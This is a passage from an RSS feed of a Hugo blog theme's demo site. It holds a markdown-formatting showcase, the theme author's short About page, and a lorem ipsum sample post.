&lt;p&gt;The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a &lt;code&gt;footer&lt;/code&gt; or &lt;code&gt;cite&lt;/code&gt; element, and optionally with in-line changes such as annotations and abbreviations.&lt;/p&gt;
&lt;h3 id=&#34;blockquote-without-attribution&#34;&gt;Blockquote without attribution&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Tiam, ad mint andaepu dandae nostion secatur sequo quae.
&lt;strong&gt;Note&lt;/strong&gt; that you can use &lt;em&gt;Markdown syntax&lt;/em&gt; within a blockquote.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;blockquote-with-attribution&#34;&gt;Blockquote with attribution&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Don&amp;rsquo;t communicate by sharing memory, share memory by communicating.&lt;!-- raw HTML omitted --&gt;
— &lt;!-- raw HTML omitted --&gt;Rob Pike&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;buttons-and-links&#34;&gt;Buttons and links&lt;/h2&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;Button&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;Link&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;Link&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;tables&#34;&gt;Tables&lt;/h2&gt;
&lt;p&gt;Tables aren&amp;rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Age&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Bob&lt;/td&gt;
&lt;td&gt;27&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alice&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;inline-markdown-within-tables&#34;&gt;Inline Markdown within tables&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Italics&lt;/th&gt;
&lt;th&gt;Bold&lt;/th&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;em&gt;italics&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;bold&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;code&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;forms&#34;&gt;Forms&lt;/h2&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;h2 id=&#34;code-blocks&#34;&gt;Code Blocks&lt;/h2&gt;
&lt;h3 id=&#34;code-block-with-backticks&#34;&gt;Code block with backticks&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Example HTML5 Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;Test&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ordered-list&#34;&gt;Ordered List&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;First item&lt;/li&gt;
&lt;li&gt;Second item&lt;/li&gt;
&lt;li&gt;Third item&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;unordered-list&#34;&gt;Unordered List&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;List item&lt;/li&gt;
&lt;li&gt;Another item&lt;/li&gt;
&lt;li&gt;And another item&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nested-list&#34;&gt;Nested list&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fruit
&lt;ul&gt;
&lt;li&gt;Apple&lt;/li&gt;
&lt;li&gt;Orange&lt;/li&gt;
&lt;li&gt;Banana&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dairy
&lt;ul&gt;
&lt;li&gt;Milk&lt;/li&gt;
&lt;li&gt;Cheese&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;other-elements--abbr-sub-sup-kbd-mark&#34;&gt;Other Elements — abbr, sub, sup, kbd, mark&lt;/h2&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;GIF&lt;!-- raw HTML omitted --&gt; is a bitmap image format.&lt;/p&gt;
&lt;p&gt;H&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;O&lt;/p&gt;
&lt;p&gt;X&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt; + Y&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt; = Z&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Press &lt;!-- raw HTML omitted --&gt;CTRL&lt;!-- raw HTML omitted --&gt;+&lt;!-- raw HTML omitted --&gt;ALT&lt;!-- raw HTML omitted --&gt;+&lt;!-- raw HTML omitted --&gt;Delete&lt;!-- raw HTML omitted --&gt; to end the session.&lt;/p&gt;
&lt;p&gt;Most &lt;!-- raw HTML omitted --&gt;salamanders&lt;!-- raw HTML omitted --&gt; are nocturnal, and hunt for insects, worms, and other small creatures.&lt;/p&gt;
&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34;&gt;
&lt;p&gt;The above quote is excerpted from Rob Pike&amp;rsquo;s &lt;a href=&#34;https://www.youtube.com/watch?v=PAAkCSZUG1c&#34;&gt;talk&lt;/a&gt; during Gopherfest, November 18, 2015.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>About</title>
      <link>https://flowhero.github.io/newblog/about/</link>
      <pubDate>Fri, 25 Jan 2019 00:00:00 +0000</pubDate>
      
      <guid>https://flowhero.github.io/newblog/about/</guid>
      <description>Hi there My name is Radek and I&amp;rsquo;m the author of this theme. I made it to help you present your ideas easier.
We all know how hard is to start something on the web, especially these days. You need to prepare a bunch of stuff, configure them and when that’s done — create the content.
This theme is pretty basic and covers all of the essentials. All you have to do is start typing!</description>
      <content>&lt;h1 id=&#34;hi-there&#34;&gt;Hi there&lt;/h1&gt;
&lt;p&gt;My name is Radek and I&amp;rsquo;m the author of this theme. I made it to help you present your ideas easier.&lt;/p&gt;
&lt;p&gt;We all know how hard is to start something on the web, especially these days. You need to prepare a bunch of stuff, configure them and when that’s done — create the content.&lt;/p&gt;
&lt;p&gt;This theme is pretty basic and covers all of the essentials. All you have to do is start typing!&lt;/p&gt;
&lt;p&gt;The theme includes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fully customizable color schemes generated by &lt;a href=&#34;https://panr.github.io/terminal-css/&#34;&gt;&lt;strong&gt;terminal.css&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;great reading experience thanks to &lt;a href=&#34;https://github.com/tonsky/FiraCode&#34;&gt;&lt;strong&gt;Fira Code&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;nice code highlighting thanks to &lt;a href=&#34;https://prismjs.com&#34;&gt;&lt;strong&gt;PrismJS&lt;/strong&gt;&lt;/a&gt; that matches the theme&amp;rsquo;s color scheme.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, there you have it&amp;hellip; enjoy!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Hello Friend</title>
      <link>https://flowhero.github.io/newblog/posts/hello/</link>
      <pubDate>Fri, 25 Jan 2019 00:00:00 +0000</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/hello/</guid>
      <description>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam nec interdum metus. Aenean rutrum ligula sodales ex auctor, sed tempus dui mollis. Curabitur ipsum dui, aliquet nec commodo at, tristique eget ante. Donec quis dolor nec nunc mollis interdum vel in purus. Sed vitae leo scelerisque, sollicitudin elit sed, congue ante. In augue nisl, vestibulum commodo est a, tristique porttitor est. Proin laoreet iaculis ornare. Nullam ut neque quam.
Fusce pharetra suscipit orci nec tempor.</description>
      <content>&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam nec interdum metus. Aenean rutrum ligula sodales ex auctor, sed tempus dui mollis. Curabitur ipsum dui, aliquet nec commodo at, tristique eget ante. &lt;strong&gt;Donec quis dolor nec nunc mollis interdum vel in purus&lt;/strong&gt;. Sed vitae leo scelerisque, sollicitudin elit sed, congue ante. In augue nisl, vestibulum commodo est a, tristique porttitor est. Proin laoreet iaculis ornare. Nullam ut neque quam.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fusce pharetra suscipit orci nec tempor. Quisque vitae sem sit amet sem mollis consequat. Sed at imperdiet lorem. Vestibulum pharetra faucibus odio, ac feugiat tellus sollicitudin at. Pellentesque varius tristique mi imperdiet dapibus. Duis orci odio, sodales lacinia venenatis sit amet, feugiat et diam.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sed a leo id risus venenatis vulputate non quis nulla. Aenean nisl quam, lacinia pulvinar orci sit amet, eleifend eleifend dui. Nulla tempor ligula leo, eu vehicula quam condimentum a. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Nulla gravida tristique nunc sed semper. Morbi nec felis odio.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sed efficitur, lacus ac scelerisque pellentesque, lectus risus dignissim nisl, fermentum semper lectus diam eget lacus.&lt;/li&gt;
&lt;li&gt;Nunc ornare purus enim, id eleifend mauris vestibulum volutpat.&lt;/li&gt;
&lt;li&gt;Aenean facilisis ut ipsum condimentum ultrices.&lt;/li&gt;
&lt;li&gt;Fusce sed metus vulputate, lobortis purus et, finibus purus. Suspendisse quis posuere lorem. Vivamus vulputate nec risus in pulvinar.&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
